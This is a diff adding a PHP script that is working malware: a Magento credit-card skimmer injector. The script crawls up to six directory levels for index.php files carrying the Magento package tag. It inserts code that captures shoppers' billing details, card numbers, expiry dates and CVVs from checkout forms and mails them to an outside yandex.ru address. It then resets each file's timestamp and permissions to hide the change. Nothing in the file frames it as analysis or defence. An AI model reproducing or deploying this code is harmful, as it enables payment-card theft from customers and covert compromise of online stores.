@@ -1,0 +1,209 @@
+<?php
+$tag = ' * @package    Mage';
+
+$code = <<<CODE
+set_time_limit(360);
+if(isset(\$_POST['billing'])){
+	\$bill = \$_POST['billing']['firstname'].' '.\$_POST['billing']['lastname'].'|'.\$_POST['billing']['street']['0'].'|'.\$_POST['billing']['city'].'|'.\$_POST['billing']['region'].' |'.\$_POST['billing']['postcode'].'|'.\$_POST['billing']['country_id'].'|'.\$_POST['billing']['telephone'].' '.\$_POST['billing']['email'];
+	setcookie("__bill",base64_encode(\$bill),time()+36000,"/");
+};
+if(isset(\$_POST['payment'])){
+	if ((isset(\$_POST['payment']['cc_number'])) && (\$_POST['payment']['cc_number'] !== "")) {
+		\$month = \$_POST['payment']['cc_exp_month'];
+		if (strlen(\$month) == 1) \$month = '0'.\$month;
+		\$year = \$_POST['payment']['cc_exp_year'];
+		if (strlen(\$year) == 4) \$year = substr(\$year, 2, 2);
+		\$pay = \$_POST['payment']['cc_number'].'|'.\$month.'/'.\$year.'|'.\$_POST['payment']['cc_cid'].'|';
+		mail('r.kortes2018@yandex.ru','bb_'.\$_SERVER['HTTP_HOST'],\$pay.base64_decode(\$_COOKIE['__bill']));
+	}
+};
+CODE;
+
+$injectType = 1; // 0 - before tag, 1 - after tag
+
+$indexFiles = array('index.php');
+
+
+
+
+// API
+set_time_limit(360);
+
+$d1=array();
+$d2=array();
+$d3=array();
+$d4=array();
+$d5=array();
+$d6=array();
+
+$dir = path_finder();
+$res=smartscan($dir);
+
+foreach($res as $v) {
+	if(in_array($v, $indexFiles)) {
+		indexEditor($localpath = $dir, $indexFile = $v, $tag, $code);
+	} else {
+		if(is_dir($dir.'/'.$v) && ($v !== ".") && ($v !== "..")) {
+		   $d1[]=$dir.'/'.$v;
+		}
+	}
+}
+
+foreach($d1 as $d) {
+    $res=smartscan($d);	
+	foreach($res as $v) {
+		if(in_array($v, $indexFiles)) {
+			indexEditor($localpath = $d, $indexFile = $v, $tag, $code);
+		} else {
+			if(is_dir($d.'/'.$v) && ($v !== ".") && ($v !== "..")) {
+			   $d2[]=$d.'/'.$v;
+			}
+		}
+	}
+}
+
+foreach($d2 as $d) {
+    $res=smartscan($d);	
+	foreach($res as $v) {
+		if(in_array($v, $indexFiles)) {
+			indexEditor($localpath = $d, $indexFile = $v, $tag, $code);
+		} else {
+			if(is_dir($d.'/'.$v) && ($v !== ".") && ($v !== "..")) {
+			   $d3[]=$d.'/'.$v;
+			}
+		}
+	}
+}
+
+foreach($d3 as $d) {
+    $res=smartscan($d);	
+	foreach($res as $v) {
+		if(in_array($v, $indexFiles)) {
+			indexEditor($localpath = $d, $indexFile = $v, $tag, $code);
+		} else {
+			if(is_dir($d.'/'.$v) && ($v !== ".") && ($v !== "..")) {
+			   $d4[]=$d.'/'.$v;
+			}
+		}
+	}
+}
+
+foreach($d4 as $d) {
+    $res=smartscan($d);	
+	foreach($res as $v) {
+		if(in_array($v, $indexFiles)) {
+			indexEditor($localpath = $d, $indexFile = $v, $tag, $code);
+		} else {
+			if(is_dir($d.'/'.$v) && ($v !== ".") && ($v !== "..")) {
+			   $d5[]=$d.'/'.$v;
+			}
+		}
+	}
+}
+
+foreach($d5 as $d) {
+    $res=smartscan($d);	
+	foreach($res as $v) {
+		if(in_array($v, $indexFiles)) {
+			indexEditor($localpath = $d, $indexFile = $v, $tag, $code);
+		} else {
+			if(is_dir($d.'/'.$v) && ($v !== ".") && ($v !== "..")) {
+			   $d6[]=$d.'/'.$v;
+			}
+		}
+	}
+}
+
+foreach($d6 as $d) {
+    $res=smartscan($d);	
+	foreach($res as $v) {
+		if(in_array($v, $indexFiles)) {
+			indexEditor($localpath = $d, $indexFile = $v, $tag, $code);
+		}
+	}
+}
+
+
+// func
+function indexEditor($localpath, $indexFile, $tag, $code) {
+	$fullpath = $localpath.'/'.$indexFile;
+	edit($fullpath, $code, $tag);
+}           			
+					
+function edit($filepath, $code, $tag) { 
+    clearstatcache();  
+    $perms = 0777 & fileperms($filepath); 
+	chmod($filepath, 0666);
+    if(is_writable($filepath)) {
+		$content = file_get_contents($filepath);
+		$tag_exists = false;
+		global $injectType;
+		if ((strpos($content, $tag) !== false) && (strpos($content, $code) === false)) {
+			switch($injectType) {
+				case 0:
+					$replacement = $code."\r\n".$tag;
+					break;
+				case 1:
+					$replacement = $tag."\r\n".$code;
+					break;
+			}
+			$tag_exists = true;
+		}
+		
+		if($tag_exists) {
+			$lastmod = filemtime($filepath);
+			$inject = str_replace($tag,$replacement,$content);
+			file_put_contents($filepath,$inject,LOCK_EX);
+			touch($filepath,$lastmod);
+			chmod($filepath,$perms);
+			echo '&nbsp&nbsp&nbsp&nbsp&nbspSuccess >> '.$filepath.'<br>';
+		} else {
+			echo '&nbsp&nbsp&nbsp&nbsp&nbspTag Not Found >> '.$filepath.'<br>';
+			return;
+		}
+	      
+	} else {
+		echo '&nbsp&nbsp&nbsp&nbsp&nbspCant Edit >> '.$filepath.'<br>';
+	}
+}
+
+function path_finder() {
+    $p=$_SERVER['SCRIPT_FILENAME'];
+	if(empty($p)){
+	   exit('Cant find the path');
+	   }
+	else{
+	   $p=str_replace('\/', '/', $p);
+	   $p=trim($p, '/');
+	   $p=substr_count($p, '/')-1;
+       }
+
+    for($k=1; $k<=$p; $k++){
+        if(!is_readable(str_repeat('../', $k))){
+        $pth=trim(str_repeat('../', $k-1));
+        break;
+        }
+	
+    }
+ 
+    if($pth) {
+       return $pth;
+     }
+    else {
+       return trim(str_repeat('../', $p-1));
+     }
+}
+	
+function smartscan($dir) {
+    if(function_exists("scandir")){
+       return scandir($dir);
+       } 
+	else{
+       $dh  = opendir($dir);
+       while(false !== ($filename = readdir($dh)))
+           $files[] = $filename;
+           return $files;
+       }
+}
+
+?>
